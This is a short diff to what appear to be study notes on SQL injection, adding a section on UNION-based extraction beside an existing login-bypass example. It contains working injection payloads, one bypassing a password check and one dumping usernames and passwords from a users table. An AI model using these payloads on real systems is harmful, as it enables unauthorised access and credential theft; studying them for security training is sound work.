@@ -73,3 +73,8 @@ Query: `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese
 
 Payload: `administrator'--`
 
+Retrieving data from other database tables
+
+Query: `SELECT name, description FROM products WHERE category = 'Gifts'`
+
+Payload: `' UNION SELECT username, password FROM users--`
